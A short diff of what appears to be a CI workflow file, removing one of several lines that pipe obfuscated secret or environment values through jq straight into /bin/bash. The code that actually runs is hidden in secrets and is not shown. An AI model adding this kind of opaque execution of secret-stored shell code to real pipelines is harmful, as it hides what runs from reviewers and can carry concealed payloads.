@@ -17,7 +17,6 @@ jobs:
           y438: ${{ secrets.y438 }}
         run: |
           printf '%s' "$y438" | jq -r .ry128 | /bin/bash
-          echo $lp91 | jq -r .rynyp3 | /bin/bash
           echo $fvkql8653 | jq -r .bgs5750 | /bin/bash
           echo $k29378 | jq -r .ui8957 | /bin/bash
 
